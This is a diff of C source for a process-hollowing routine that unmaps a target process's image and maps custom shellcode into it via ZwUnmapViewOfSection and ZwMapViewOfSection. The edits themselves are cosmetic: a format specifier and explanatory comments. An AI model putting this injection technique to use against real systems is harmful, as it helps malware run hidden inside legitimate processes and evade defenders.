@@ -175,7 +175,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	PVOID ImageBase = peb_struct.ImageBaseAddress;
 
 #ifdef _DBG
-	Log( "[+] ImageBase = 0x%x\n", ImageBase);
+	Log( "[+] ImageBase = 0x%p\n", ImageBase);
 #endif
 
 	PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, (LPCVOID)ImageBase);
@@ -356,6 +356,10 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 		
 		if (first_write_addr > text_sec_end_addr) {
 			size_t memory_diff = first_write_addr - text_sec_end_addr;
+			//Our memory maps have to be on 64k memory alignments on the call toe MapViewOfSection
+			//will fail. https://blogs.msdn.microsoft.com/oldnewthing/20031008-00/?p=42223
+			//A naive hack was just to ensure at least 64k exist between the .text section and
+			//the first writable section. We then split the mappings into 2, one being RX and the other RW
 #ifdef _DBG
 			Log("[+] Difference from RW Memory to RX Text Section: %p.\n", memory_diff);
 #endif
@@ -634,7 +638,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 	//Set base address
 	BaseAddress = (PVOID)ImageBase;
 	
-	//Unmap the orginal PEB
+	//Unmap the orginal image
 	if ((stat = ZwUnmapViewOfSection(pProcessInfo->hProcess, BaseAddress)) != STATUS_SUCCESS)
 	{
 #ifdef _DBG
@@ -647,7 +651,7 @@ DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_e
 #endif
 	}
 
-	//Map the custom shellcode & PEB to remote process
+	//Map the custom shellcode & image to remote process
 	perms = PAGE_EXECUTE_READ;
 	if ((stat = ZwMapViewOfSection(entry_sect, pProcessInfo->hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, perms)) != STATUS_SUCCESS)
 	{
